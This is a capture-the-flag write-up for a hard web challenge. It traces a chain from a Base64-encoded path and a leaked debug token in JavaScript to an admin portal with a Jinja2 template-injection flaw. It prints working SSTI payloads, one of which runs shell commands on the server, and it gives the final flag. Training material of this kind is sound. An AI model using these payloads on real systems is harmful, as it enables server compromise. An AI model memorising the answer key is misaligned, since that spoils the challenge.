# Challenge 05 Writeup: The Last Layer

## Category
Web Security

## Difficulty
Hard (300 Points)

## Learning Objective
Master multi-stage web application security assessments: reconnaissance, JavaScript analysis, hidden API discovery, authorization bypass, and Server-Side Template Injection (SSTI).

## Tools Required
- Web Browser & Developer Tools (F12)
- cURL / Python `requests` / CyberChef

## Target URL
The **Target URL** shown on the CyberQuest platform (e.g. `https://cyberquest-backend-ar9r.onrender.com/api/challenges/target/last-layer-hub`)

> The challenge routes are integrated into the main backend — no separate server is needed.

## Multi-Stage Solution Steps

### Step 1: Download & Decode the Artifact
Download `last_layer.txt` from the File URL shown on the platform.
The file contains:
```
CYBERQUEST RECOVERY ARTIFACT #7701
===================================
TRANSMISSION DATA LAYER 1:

L2FwaS9jaGFsbGVuZ2VzL3RhcmdldC9sYXN0LWxheWVyLWh1Yg==
```
Base64-decode the payload (e.g. using CyberChef):
```
/api/challenges/target/last-layer-hub
```
Prepend the backend URL to get the full target: `{BACKEND_URL}/api/challenges/target/last-layer-hub`
This is the same URL shown in the platform's **Target URL** field.

### Step 2: Reconnaissance
Navigate to the target URL. Inspect the rendered staging developer hub page.

### Step 3: Client-side JavaScript Analysis
Open Browser Developer Tools (`F12`) → **Sources** or **Network** tab, or open:
```
{BACKEND_URL}/api/challenges/target/last-layer-hub/static/js/app.js
```
Find the developer comment:
```javascript
/**
 * TODO: Remove legacy debug endpoint before production launch!
 * DEBUG ROUTE: /api/v1/debug_status?token=dev_preview_2026
 */
```

### Step 4: Discover Hidden Endpoint & Access Key
Visit `{BACKEND_URL}/api/challenges/api/v1/debug_status?token=dev_preview_2026`.

> **Note:** Because the debug endpoint is registered under the `/api/challenges` blueprint prefix, the full URL is:
> `{BACKEND_URL}/api/challenges/api/v1/debug_status?token=dev_preview_2026`

The API returns JSON:
```json
{
  "access_key": "dev_preview_2026",
  "admin_portal": "/admin_portal",
  "environment": "staging",
  "notice": "Access {BACKEND_URL}/admin_portal?access_key=dev_preview_2026 for internal report preview generation.",
  "status": "healthy"
}
```

### Step 5: Access Admin Portal & Identify Vulnerability
Navigate to `{BACKEND_URL}/admin_portal?access_key=dev_preview_2026`.

> **Note:** `/admin_portal` is registered directly at the blueprint level. Because the challenges blueprint is mounted at `/api/challenges`, this route is accessible at:
> `{BACKEND_URL}/api/challenges/admin_portal?access_key=dev_preview_2026`

Observe the "Internal Admin Report Preview" form.
Test if the report title parameter is vulnerable to Server-Side Template Injection (SSTI):
Submit input: `{{ 7 * 7 }}` into the title field.
Output renders: `Report Header Output: 49`, confirming Jinja2 template execution!

### Step 6: Exploit SSTI & Capture Flag
Submit template expression to output the injected `flag` variable:
Submit: `{{ flag }}`
Output renders: `CTF{one_layer_was_never_enough}`!

Alternatively, execute SSTI file read:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`

## Expected Observations
- Step 1: Base64 decoded to the hub path.
- Step 2: Staging home page loaded at `/api/challenges/target/last-layer-hub`.
- Step 3: Debug route `/api/v1/debug_status?token=dev_preview_2026` discovered in JS.
- Step 4: Secret `/admin_portal` and `access_key` revealed.
- Step 5: `{{ 7*7 }}` returns `49`.
- Step 6: `{{ flag }}` extracts `CTF{one_layer_was_never_enough}`.

## Final Flag
`CTF{one_layer_was_never_enough}`
